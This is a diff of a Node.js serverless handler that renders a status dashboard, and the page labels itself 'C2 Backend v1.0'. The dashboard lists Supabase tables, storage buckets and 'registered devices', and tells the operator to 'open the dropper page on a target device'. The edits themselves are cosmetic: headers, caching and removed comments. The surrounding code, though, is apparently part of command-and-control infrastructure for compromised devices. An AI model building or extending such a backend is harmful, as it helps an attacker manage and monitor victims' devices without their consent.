@@ -1,5 +1,5 @@
 // ============================================================
-//  TEST FILE — Modern Status Panel
+//  TEST FILE — Modern Status Panel (FORCED HTML)
 //  Endpoint: /api/test
 // ============================================================
 
@@ -17,12 +17,15 @@ if (supabaseUrl && supabaseKey) {
 }
 
 // ============================================================
-//  MAIN HANDLER
+//  MAIN HANDLER — ALWAYS RETURNS HTML
 // ============================================================
 module.exports = async (req, res) => {
-    // Set CORS and content type
-    res.setHeader('Content-Type', 'text/html');
+    // FORCE HTML CONTENT TYPE
+    res.setHeader('Content-Type', 'text/html; charset=utf-8');
     res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
+    res.setHeader('Pragma', 'no-cache');
+    res.setHeader('Expires', '0');
 
     if (req.method === 'OPTIONS') {
         return res.status(200).end();
@@ -124,9 +127,9 @@ module.exports = async (req, res) => {
                      Object.values(results.tables).every(v => v === '✅');
 
     // ============================================================
-    //  RENDER MODERN HTML PANEL
+    //  BUILD AND SEND HTML
     // ============================================================
-    return res.send(`<!DOCTYPE html>
+    const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -263,13 +266,6 @@ module.exports = async (req, res) => {
             .header { flex-direction: column; align-items: stretch; text-align: center; }
             .header .time { text-align: center; }
         }
-        .text-center { text-align: center; }
-        .mt-12 { margin-top: 12px; }
-        .mt-20 { margin-top: 20px; }
-        .mb-8 { margin-bottom: 8px; }
-        .gap-4 { gap: 4px; }
-        .flex { display: flex; align-items: center; }
-        .flex-wrap { flex-wrap: wrap; }
         .footer-text { text-align: center; margin-top: 24px; font-size: 11px; color: #4a4a6a; }
         .footer-text a { color: #88ccff; text-decoration: none; }
         .footer-text a:hover { text-decoration: underline; }
@@ -279,7 +275,6 @@ module.exports = async (req, res) => {
 <body>
 <div class="container">
 
-    <!-- HEADER -->
     <div class="header">
         <h1><span>☠️</span> System Status</h1>
         <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
@@ -292,10 +287,7 @@ module.exports = async (req, res) => {
         </div>
     </div>
 
-    <!-- GRID -->
     <div class="grid">
-
-        <!-- Supabase -->
         <div class="card">
             <div class="label">📦 Supabase</div>
             <div class="value">
@@ -306,7 +298,6 @@ module.exports = async (req, res) => {
             ${results.supabase.error ? `<div class="sub" style="color:#ff5e5e;">${results.supabase.error}</div>` : ''}
         </div>
 
-        <!-- Bucket -->
         <div class="card">
             <div class="label">📁 Storage Bucket</div>
             <div class="value">
@@ -316,14 +307,12 @@ module.exports = async (req, res) => {
             <div class="sub">${results.bucket.buckets.length > 0 ? `Buckets: ${results.bucket.buckets.join(', ')}` : 'No buckets found'}</div>
         </div>
 
-        <!-- Devices -->
         <div class="card">
             <div class="label">📱 Devices</div>
             <div class="value">${results.sample.count}</div>
             <div class="sub">Registered devices</div>
         </div>
 
-        <!-- Recent Activity -->
         <div class="card">
             <div class="label">⚡ Recent Activity</div>
             <div style="font-size:13px;color:#aab;margin-top:4px;line-height:1.8;">
@@ -334,7 +323,6 @@ module.exports = async (req, res) => {
         </div>
     </div>
 
-    <!-- TABLES STATUS -->
     <div class="card card-full">
         <div class="label">🗄️ Database Tables</div>
         <div class="table-wrap">
@@ -352,7 +340,6 @@ module.exports = async (req, res) => {
         </div>
     </div>
 
-    <!-- SAMPLE DEVICES -->
     <div class="card card-full">
         <div class="label">📋 Recent Devices</div>
         ${results.sample.devices.length > 0 ? `
@@ -373,7 +360,6 @@ module.exports = async (req, res) => {
         ` : `<div style="color:#4a6a7a;padding:12px 0;">No devices registered yet. Open the dropper page on a target device.</div>`}
     </div>
 
-    <!-- ENDPOINTS -->
     <div class="card card-full">
         <div class="label">🔗 Available Endpoints</div>
         <div style="display:flex;flex-wrap:wrap;gap:4px 16px;padding:8px 0;font-size:13px;color:#4a6a7a;font-family:'Courier New',monospace;">
@@ -390,12 +376,16 @@ module.exports = async (req, res) => {
         </div>
     </div>
 
-    <!-- FOOTER -->
     <div class="footer-text">
         🔐 Dashboard: <a href="https://angeljangra.github.io/dashboard/dashboard.html" target="_blank">Open Admin Panel</a>
         &nbsp;·&nbsp; ⚡ C2 Backend v1.0
     </div>
 </div>
 </body>
-</html>`);
+</html>`;
+
+    // ============================================================
+    //  SEND HTML
+    // ============================================================
+    return res.status(200).send(html);
 };
